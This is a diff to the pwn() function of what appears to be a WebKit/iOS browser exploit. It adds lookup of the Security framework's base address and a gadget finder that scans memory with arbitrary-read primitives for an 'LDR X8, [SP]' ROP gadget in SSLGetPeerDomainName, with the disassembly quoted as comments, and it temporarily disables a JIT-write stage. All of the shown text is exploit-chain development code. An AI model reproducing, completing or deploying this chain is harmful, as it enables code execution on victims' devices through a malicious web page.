@@ -480,6 +480,10 @@ function pwn() {
     var webcore_base = find_dylib_by_name(libcpp1_base, "/System/Library/PrivateFrameworks/WebCore.framework/WebCore")
     log(`[+] webcore_base: ${webcore_base}`);
 
+    var security_base = find_dylib_by_name(libcpp1_base, "/System/Library/Frameworks/Security.framework/Security")
+    log(`[+] security_base: ${security_base}`);
+
+
     var libsystem_platform_base = find_dylib_by_name(libcpp1_base, "libsystem_platform")
     log(`[+] libsystem_platform_base: ${libsystem_platform_base}`);
 
@@ -494,7 +498,7 @@ function pwn() {
     log(`[+] dlsym: ${dlsym_addr}`);
 
     //TEMPORARY DISABLED START
-    var temp_disabled = false;
+    var temp_disabled = true;
     if(!temp_disabled) {
     var jitWriteSeparateHeaps_addr = find_symbol_address(jsc_base, "___ZN3JSC29jitWriteSeparateHeapsFunctionE");
     log(`[+] jitWriteSeparateHeaps: ${jitWriteSeparateHeaps_addr}`);
@@ -523,6 +527,7 @@ function pwn() {
     
     
     //FIND GADGETS...
+    // 1. STACKLOADER
     var mach_vm_map_addr = find_symbol_address(libsystem_kernel_base, "__mach_vm_map");
     log(`[+] mach_vm_map: ${mach_vm_map_addr}`);
     try_count = 0;
@@ -554,7 +559,39 @@ function pwn() {
 
     log(`[+] stackloader: ${stackloader}`);
 
-    // return;
+    // 2. LDRX8
+    var SSLGetPeerDomainName_addr = find_symbol_address(security_base, "__SSLGetPeerDomainName");
+    log(`[+] SSLGetPeerDomainName_addr: ${SSLGetPeerDomainName_addr}`);
+    try_count = 0;
+    var ldrx8 = Add(security_base, SSLGetPeerDomainName_addr);
+    while (true) {
+        if(try_count > 200) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        // Security:__text:0000000181B5C478                 LDR             X8, [SP]
+        // Security:__text:0000000181B5C47C                 STR             X8, [X19]
+        // Security:__text:0000000181B5C480
+        // Security:__text:0000000181B5C480 loc_181B5C480                           ; CODE XREF: _SSLGetPeerDomainName_0+2C↑j
+        // Security:__text:0000000181B5C480                                         ; _SSLGetPeerDomainName_0+44↑j ...
+        // Security:__text:0000000181B5C480                 LDP             X29, X30, [SP,#0x20]
+        // Security:__text:0000000181B5C484                 LDP             X20, X19, [SP,#0x10]
+        // Security:__text:0000000181B5C488                 ADD             SP, SP, #0x30 ; '0'
+        // Security:__text:0000000181B5C48C                 RET
+        opcode = read64(ldrx8);
+        opcode2 = read64(Add(ldrx8, 0x8))
+        opcode3 = read64(Add(ldrx8, 0x10))
+        if(opcode == 0xF9000268F94003E8 && opcode2 == 0xA9414FF4A9427BFD && opcode3 == 0xD65F03C09100C3FF) {
+            break;
+        }
+        ldrx8 = Add(ldrx8, 0x8);
+        try_count++;
+    }
+    log(`[+] ldrx8: ${ldrx8}`);
+
+
+    return;
 
 
 
